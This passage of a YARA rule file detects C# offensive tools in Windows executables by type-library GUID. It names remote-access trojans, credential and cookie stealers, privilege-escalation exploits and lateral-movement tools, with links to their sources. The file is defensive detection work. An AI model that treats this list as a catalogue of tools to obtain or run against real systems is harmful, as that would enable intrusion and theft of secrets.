$typelibguid6 = \"5d28f15e-3bb8-4088-abe0-b517b31d4595\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpFruit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpFruit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3da2f6de-75be-4c9d-8070-08da45e79761\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWitness {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/SharpWitness\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9f6ec34-4ccc-4247-bcef-c1daab9b4469\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RexCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/syrex1013/RexCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"10cd7c1c-e56d-4b1b-80dc-e4c496c5fec5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharPersist {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/SharPersist\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9d1b853e-58f1-4ba5-aefc-5c221ca30e48\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2019_1253 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/CVE-2019-1253\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"584964c1-f983-498d-8370-23e27fdd0399\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_scout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/scout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d9c76e82-b848-47d4-8f22-99bf22a8ee11\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Grouper2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/l0ss/Grouper2/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5decaea3-2610-4065-99dc-65b9b4ba6ccd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CasperStager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ustayready/CasperStager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c653a9f2-0939-43c8-9b93-fed5e2e4c7e6\" ascii nocase wide\n        $typelibguid1 = \"48dfc55e-6ae5-4a36-abef-14bc09d7510b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TellMeYourSecrets {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/TellMeYourSecrets\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9b448062-7219-4d82-9a0a-e784c4b3aa27\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpExcel4_DCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpExcel4-DCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"68b83ce5-bbd9-4ee3-b1cc-5e9223fab52b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShooter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/SharpShooter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"56598f1c-6d88-4994-a392-af337abe5777\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NoMSBuild {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/NoMSBuild\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"034a7b9f-18df-45da-b870-0e1cef500215\" ascii nocase wide\n        $typelibguid1 = \"59b449d7-c1e8-4f47-80b8-7375178961db\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TeleShadow2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ParsingTeam/TeleShadow2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"42c5c356-39cf-4c07-96df-ebb0ccf78ca4\" ascii nocase wide\n        $typelibguid1 = \"0242b5b1-4d26-413e-8c8c-13b4ed30d510\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BadPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BeichenDream/BadPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0527a14f-1591-4d94-943e-d6d784a50549\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LethalHTA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/codewhitesec/LethalHTA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"784cde17-ff0f-4e43-911a-19119e89c43f\" ascii nocase wide\n        $typelibguid1 = \"7e2de2c0-61dc-43ab-a0ec-c27ee2172ea6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpStat {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Raikia/SharpStat\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ffc5c721-49c8-448d-8ff4-2e3a7b7cc383\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SneakyService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/SneakyService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"897819d5-58e0-46a0-8e1a-91ea6a269d84\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7fbad126-e21c-4c4e-a9f0-613fcf585a71\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"51960f7d-76fe-499f-afbd-acabd7ba50d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Inception {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/Inception\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"03d96b8c-efd1-44a9-8db2-0b74db5d247a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_sharpwmi {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/sharpwmi\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"bb357d38-6dc1-4f20-a54c-d664bd20677e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2019_1064 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RythmStick/CVE-2019-1064\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ff97e98a-635e-4ea9-b2d0-1a13f6bdbc38\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Tokenvator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Tokenvator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"4b2b3bd4-d28f-44cc-96b3-4a2f64213109\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WheresMyImplant {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/WheresMyImplant\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cca59e4e-ce4d-40fc-965f-34560330c7e6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Naga {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/byt3bl33d3r/Naga\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"99428732-4979-47b6-a323-0bb7d6d07c95\" ascii nocase wide\n        $typelibguid1 = \"a2c9488f-6067-4b17-8c6f-2d464e65c535\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBox {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P1CKLES/SharpBox\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"616c1afb-2944-42ed-9951-bf435cadb600\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_rundotnetdll32 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/rundotnetdll32\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a766db28-94b6-4ed1-aef9-5200bbdd8ca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AntiDebug {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/AntiDebug\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"997265c1-1342-4d44-aded-67964a32f859\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvisibleRegistry {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/DInvisibleRegistry\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"31d576fb-9fb9-455e-ab02-c78981634c65\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TikiTorch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/TikiTorch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"806c6c72-4adc-43d9-b028-6872fa48d334\" ascii nocase wide\n        $typelibguid1 = \"2ef9d8f7-6b77-4b75-822b-6a53a922c30f\" ascii nocase wide\n        $typelibguid2 = \"8f5f3a95-f05c-4dce-8bc3-d0a0d4153db6\" ascii nocase wide\n        $typelibguid3 = \"1f707405-9708-4a34-a809-2c62b84d4f0a\" ascii nocase wide\n        $typelibguid4 = \"97421325-b6d8-49e5-adf0-e2126abc17ee\" ascii nocase wide\n        $typelibguid5 = \"06c247da-e2e1-47f3-bc3c-da0838a6df1f\" ascii nocase wide\n        $typelibguid6 = \"fc700ac6-5182-421f-8853-0ad18cdbeb39\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HiveJack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Viralmaniar/HiveJack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e12e62fe-bea3-4989-bf04-6f76028623e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DecryptAutoLogon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/DecryptAutoLogon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"015a37fc-53d0-499b-bffe-ab88c5086040\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UnstoppableService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/UnstoppableService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0c117ee5-2a21-dead-beef-8cc7f0caaa86\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWMI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpWMI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EWSToolkit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/EWSToolkit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ca536d67-53c9-43b5-8bc8-9a05fdc567ed\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SweetPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SweetPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6aeb5004-6093-4c23-aeae-911d64cacc58\" ascii nocase wide\n        $typelibguid1 = \"1bf9c10f-6f89-4520-9d2e-aaf17d17ba5e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_memscan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/memscan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"79462f87-8418-4834-9356-8c11e44ce189\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpStay {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpStay\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2963c954-7b1e-47f5-b4fa-2fc1f0d56aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLocker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Pickfordmatt/SharpLocker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a6f8500f-68bc-4efc-962a-6c6e68d893af\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SauronEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/vivami/SauronEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0f43043d-8957-4ade-a0f4-25c1122e8118\" ascii nocase wide\n        $typelibguid1 = \"086bf0ca-f1e4-4e8f-9040-a8c37a49fa26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_sitrep {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/sitrep\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"12963497-988f-46c0-9212-28b4b2b1831b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpClipboard {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpClipboard\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"97484211-4726-4129-86aa-ae01d17690be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCookieMonster {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/m0rv4i/SharpCookieMonster\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"566c5556-1204-4db9-9dc8-a24091baaa8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_p0wnedShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Cn33liz/p0wnedShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2e9b1462-f47c-48ca-9d85-004493892381\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMove {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpMove\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"8bf82bbe-909c-4777-a2fc-ea7c070ff43e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_C_Sharp_R_A_T_Client {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/AdvancedHacker101/C-Sharp-R.A.T-Client\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6d9e8852-e86c-4e36-9cb4-b3c3853ed6b8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpPrinter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpPrinter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"41b2d1e5-4c5d-444c-aa47-629955401ed9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EvilFOCA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ElevenPaths/EvilFOCA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f26bdb4a-5846-4bec-8f52-3c39d32df495\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoshC2_Misc {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/PoshC2_Misc\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"85773eb7-b159-45fe-96cd-11bad51da6de\" ascii nocase wide\n        $typelibguid1 = \"9d32ad59-4093-420d-b45c-5fff391e990d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharpire {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Sharpire\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"39b75120-07fe-4833-a02e-579ff8b68331\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_SMBExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-SMBExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"344ee55a-4e32-46f2-a003-69ad52b55945\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MiscTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/MiscTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"384e9647-28a9-4835-8fa7-2472b1acedc0\" ascii nocase wide\n        $typelibguid1 = \"d7ec0ef5-157c-4533-bbcd-0fe070fbf8d9\" ascii nocase wide\n        $typelibguid2 = \"10085d98-48b9-42a8-b15b-cb27a243761b\" ascii nocase wide\n        $typelibguid3 = \"6aacd159-f4e7-4632-bad1-2ae8526a9633\" ascii nocase wide\n        $typelibguid4 = \"49a6719e-11a8-46e6-ad7a-1db1be9fea37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MemoryMapper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/MemoryMapper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9fbf3ac-05d8-4cd5-9694-b224d4e6c0ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_VanillaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DannyTheSloth/VanillaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d0f2ee67-0a50-423d-bfe6-845da892a2db\" ascii nocase wide\n        $typelibguid1 = \"a593fcd2-c8ab-45f6-9aeb-8ab5e20ab402\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UnmanagedPowerShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/UnmanagedPowerShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"dfc4eebb-7384-4db5-9bad-257203029bd9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Quasar {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/quasar/Quasar\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cfda6d2e-8ab3-4349-b89a-33e1f0dab32b\" ascii nocase wide\n        $typelibguid1 = \"c7c363ba-e5b6-4e18-9224-39bc8da73172\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAdidnsdump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpAdidnsdump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cdb02bc2-5f62-4c8a-af69-acc3ab82e741\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DotNetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7e3f231c-0d0b-4025-812c-0ef099404861\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Inferno {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Inferno\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"26d498f7-37ae-476c-97b0-3761e3a919f0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSearch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"98fee742-8410-4f20-8b2d-d7d789ab003d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSecDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = 